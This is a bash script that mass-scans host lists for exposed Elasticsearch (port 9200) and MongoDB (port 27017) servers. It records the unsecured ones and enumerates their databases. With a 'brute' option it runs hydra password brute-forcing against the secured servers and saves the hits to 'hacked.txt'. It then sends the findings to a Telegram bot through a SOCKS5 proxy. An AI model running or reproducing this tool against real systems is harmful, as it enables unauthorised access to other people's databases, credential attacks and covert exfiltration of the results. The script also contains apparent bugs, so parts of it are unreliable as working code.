#!/bin/bash

tgkey=""
chat_id=""
proxy_ip=""
proxy_login=""
proxy_pass=""
proxy_port =""

#Check parametrs
if [ -n "$2" ]
	then
	echo masscan port:$1 hosts:$2
else
	echo "No parameters found. "
	echo "Usage: ./scan.sh port host(/s)_list Example: ./scan.sh 9200 hostlist.txt OR ./scan.sh 27017 hostlist.txt brute"
	echo "If you want bruteforce secured host - try parameter brute"
	echo "Required: masscan nmap grep awk"
	exit
fi

#Clear report file

if [[ "$1" == "9200" ]]; then
echo "" > elastic.txt
echo "" > elastic_secured.txt
fi

if [[ "$1" == "27017" ]]; then
echo "" > mongodb.txt
echo "" > mongodb_secured.txt
fi


#Clear variable for filename
out=$( echo $2 | sed 's/\///g' | sed 's/\,//g' | sed 's/\.//g' )
echo $out 

#Scan targets
masscan -p $1 -iL $2 -oG $out.out

#Find hosts with opened target ports
grep open $out.out | awk {'print $2'} > map.input

#ELK_check
if [[ "$1" == "9200" ]]; then

	cat map.input | while read line
do
	if curl --connect-timeout 2 -X GET "$line:9200/" | grep "You Know, for Search";
		then echo $line >> elastic.txt; 
		nmap $line -p$1 --script=elastic | grep "|">> elastic.txt
	fi
	
	if curl --connect-timeout 2 -X GET "$line:9200/" | grep "security_exception";
		then echo $line >> elastic_secured.txt;
fi
done
fi

#MGDB_check

if [[ "$1" == "27017" ]]; then

        cat map.input | while read line
do
	mdbstat=$(nmap $line -p$1 --script=mongodb-info.nse | grep -v codeName | grep code | awk {'print $4'})
	
	if  [[ "$mdbstat" == "13" ]]; then echo $line >> mongodb_secured.txt; 
	else
        	echo $line >> mongodb.txt;
		nmap $line -p$1 --script=mongodb-databases.nse | grep "|">> mongodb.txt
        fi
done
fi

#brute if need

if [[ "$3" == "brute" ]]; then
#brute secured elastics


if [[ $(find ./ -name elastic_secured.txt -type f -size +1 2>/dev/null) ]]; 

	then /usr/bin/hydra -M ./elastic_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 9200 -o ./hacked.txt http-get /

fi


#brute secured mongo

if [[ $(find ./ -name  mongodb_secured.txt -type f -size +1 2>/dev/null) ]];

        then /opt/bin/hydra -M ./mongodb_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 27017 -o ./hacked_mongo.txt mongodb

fi
fi
#backup output files
rm -f $out.out
rm -f map.input 
mv -f mongodb_secured.txt mongodb_secured.txt_`date +%s`
mv -f mongodb.txt mongodb.txt_`date +%s`
mv -f elastic_secured.txt elastic_secured.txt_`date +%s`
mv -f elastic.txt elastic.txt_`date +%s`
mv -f hacked_mongo.txt hacked_mongo.txt_`date +%s`
mv -f hacked.txt hacked.txt_`date +%s`


#send result

if [[ $(find ./ -name elastic.txt -type f -size +1 2>/dev/null) ]];

        then  curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@elastic.txt -F "chat_id=$chat_id"
 
fi


if [[ $(find ./ -name mongodb.txt -type f -size +1 2>/dev/null) ]];


        then  curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@mongodb.txt -F "chat_id=$chat_id"


fi

